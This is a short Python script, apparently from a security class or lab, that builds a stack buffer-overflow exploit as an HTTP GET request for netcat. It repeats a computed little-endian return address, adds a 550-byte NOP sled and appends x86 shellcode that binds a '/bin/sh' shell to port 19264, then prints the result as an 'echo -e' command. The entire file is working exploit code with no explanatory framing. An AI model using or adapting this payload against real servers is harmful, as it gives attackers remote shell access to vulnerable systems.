# Creates a GET request for netcat

# Script to compute return address in reverse order based on a decimal address
# Note you can do something like `0xbfffffff - 200` as input in Python
def compute_address(decimalAddr):
    hexAddr = hex(decimalAddr)
    # Drop of `0x`
    hexAddr = hexAddr[2:]

    # Add a leading zero if the number of digits is odd
    if len(hexAddr) % 2 == 1:
        hexAddr = "0%s" % hexAddr

    # Split the address array of pairs
    hexAddr = [hexAddr[i:i+2] for i in range(0, len(hexAddr), 2)]
    # Reverse
    hexAddr.reverse()

    attack_address = ""
    # Add in the \x
    for addr in hexAddr:
        attack_address += "\\x%s" % addr

    return attack_address

address = compute_address(0xbfffffff - 80*4)

# Breaks the local server
# address = compute_address(4294954700 + 4 * 16)

addressLen = 44
noopLen = 550

# Shell code which attacks port 19264
shellcode = "\\x31\\xdb\\xf7\\xe3\\xb0\\x66\\x43\\x52\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x5b\\x5e\\x52\\x66\\x68\\x4b\\x40\\x6a\\x10\\x51\\x50\\xb0\\x66\\x89\\xe1\\xcd\\x80\\x89\\x51\\x04\\xb0\\x66\\xb3\\x04\\xcd\\x80\\xb0\\x66\\x43\\xcd\\x80\\x59\\x93\\x6a\\x3f\\x58\\xcd\\x80\\x49\\x79\\xf8\\xb0\\x0b\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x41\\xcd\\x80";
shellCodeLength = len(shellcode) / 4

# In bytes
totalLength = (4 * addressLen) + noopLen + shellCodeLength

# Total Length % 256 must be < 100
if (totalLength % 256 >= 100):
    print("Incorrect Total Length of String")
    quit()

request = "GET /"

for i in range(addressLen):
    request += address

for i in range(noopLen):
    request += "\\x90"

request += shellcode

request += " HTTP"



print('echo -e ' + request + '')
